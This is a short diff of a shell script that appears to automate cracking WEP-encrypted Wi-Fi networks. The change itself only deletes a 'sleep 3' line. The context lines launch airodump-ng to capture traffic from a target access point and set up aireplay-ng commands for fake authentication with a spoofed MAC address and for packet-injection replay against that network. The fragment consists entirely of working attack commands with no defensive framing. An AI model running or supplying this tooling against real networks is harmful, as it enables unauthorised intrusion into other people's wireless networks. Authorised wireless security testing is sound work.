@@ -74,8 +74,6 @@ else
 
 	gnome-terminal -x sh -c "airodump-ng -t WEP -c $CH -w $2 --bssid $BSSID mon0" &
 
-	sleep 3
-
 	command0="aireplay-ng -1 6000 -q 10 -o 1 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
 	command1="aireplay-ng -1 6 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
 	command2="aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $FAKE_MAC -F mon0"
